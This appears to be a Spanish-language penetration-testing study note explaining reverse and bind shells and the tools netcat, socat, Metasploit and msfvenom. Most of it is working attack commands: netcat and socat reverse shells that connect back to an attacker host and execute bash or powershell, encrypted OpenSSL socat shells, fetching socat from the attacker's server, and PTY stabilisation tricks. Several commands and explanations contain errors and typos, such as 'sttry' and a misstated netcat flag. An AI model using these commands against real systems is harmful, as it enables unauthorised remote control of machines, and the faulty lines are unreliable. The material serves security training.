# ¿QUÉ ES UNA SHELL?

Antes de meternos dentro de como mandar o recibir shells. Deberemos entender que es una shell. En terminos simples, las shell es cuando usamos la interzan con un CLI "Command Line environment"

El programas como bash o sh en linus tenemos ejemplos de shells en windows tenemos cmd o powershell.

Cuando tenemos target y quremos ejecutar código arbitrario

En terminos simples, nosotros forzamos el envio de un comando para darnos acceso por una (reverse shell), abrir otro puerto por cual nosotros nos conectamos.

# HERRAMIENTAS

## NETCAT

Netcal "Swiss Army Knife" para las redes. Se usa para todo tipo de redes, incluyendo durante una enumeración, pero los masi mportante en muchos casos, se usa para recibir shells reversas y conectar a puertos remotos para ganar acceso. Normalmente son inestables y se utilizan tecnicas para mejorarlas.

## SOCAT

Socat es como netcat pero con esteroides. Hace todo y mucho más. Son mucho mas estables. pero estos dos grandes fallos:

1- La sintasis es mucho más complicada.
2- Netcat esta instalado en todos los sistemas linus, cosa se Socat no.

## Metasploit -- multi/handler

El modulo de metasploit framework es como socat y netcat para recibir shells reversas. provee shells estables.

## Msfvenom

Como multi/handler, msfvenom es tecnicamente parte de metasploit, sin embargo podemos generar reverse shells y lo mismo.

/usr/share/webshells

# TIPOS DE SHELLS

En alto nivel tenemos dos tipos de shells "Reverse Shells" - "Bind Shells" 

- Reverse shells: Cuando es forzado a ejectuar codigo remoto. En nuestro propio ordenador podemos utilizar herramientas anteriormente mencionadas en la anterior sección y ejecutar un "listener". Las reverse shells son buenas para bypasear firewalls o reglas de la conexión de puertos del target, sin embargo, cuando recibes la shell a traves de internet, necesitas configurar tu propia red para aceptar dicha sehll.
  
- Bind Shells: Cuando se ejecuta código del target se usa para empezar un "listener" de una shell directa al target. Una vez subida a internet se conectan al puerto el codigo obtiene un codigo remoto.

```
sudo nc -lvnp 443
nc <Local-IP> <Port> -e /bin/bash
```

![image](https://github.com/user-attachments/assets/51c3a4e4-eafe-4287-b749-f1a76ada6528)

![image](https://github.com/user-attachments/assets/8de86404-33ed-4bc4-8e6a-02340d633534)

![image](https://github.com/user-attachments/assets/2d7afccb-0401-497b-8f6d-77df41ac1cb4)

# NETCAT

Mencionado previamente, netcat es una herramienta basicap ara los penetrations tester

## REVERSE SHELLS

```
nc -lvnp puerto
```

- -l : listener
- -v : verbose
- -n : resuelve host o use dns
- -p : Puerto específico

```
sudo nc -lvnp 443
```

## BIND SHELLS

```
nc taget puerto
```

# ESTABILIZACIÓN DE SHELL

Una vez nos conectemos por netcat estas shells suelen ser muy inestables. Si presionamos Ctrl + C la mataremos. Esto no es interactivo, y nos dara muchos erroes.

## TÉCNICA 1 - PYTHON

```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
```

![image](https://github.com/user-attachments/assets/4f63d7c8-ad0d-4c29-97d6-f37505aa2cfa)

## TÉCNICA 2 - RLWRAP

Rlwrap es un programa con simples terminos, nos da acceso al historias, la tabla se autocompleta recibiendo una shell, sin embargo se usa para habilitar Ctrl + c dentro de la shell 

```
sudo apt install rlwrap
rlwrap nc -lvnp puerto
ctrl +x
sttry raw -echo; fg
```

## TÉCNICA 3 : SOCAT

La tercera es la más facil de estabilizar 

```
sudo python3 -m http.server 80
wget localip/socat -O /tmp/socat
stty -a
```

![image](https://github.com/user-attachments/assets/f8a09b70-9d61-4561-9402-1c13cacf9ce7)


# SOCAT

Socat es similar a netcar, pero fundamentalmente diferente en otros factores. La forma más fácil para entedner socar es la conexión entre dos puntos. Lo interesante es lo fácil y esencial que escuchar un puerto o 2.

## REVERSE SHELL

```
socat TCP -L:port
nc -lvnp port
socat TCP:LocalIP:LOCALport EXEC:powershell.exe,pipes
socat TCP:LocalIP:LocalPOrt EXEC:"bash -li"
```

## BIND SHELLS

```
socat TCP-L:Port EXEC:"bash -li"
```
# SOCAT SHELLS ENCRIPTADAS

Primero deberemos genear un certificado para usalo para encriptar

```
# Creamos certificado
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
# Dos ficheros en uno
cat shell.key shell.crt > shell.pem
# CUANDO LA REV SHELL ESTE EN ESCUCHA
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# PARA VOLVERSE A CONECTAR
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
# TARGET
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
# ATACKER
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```





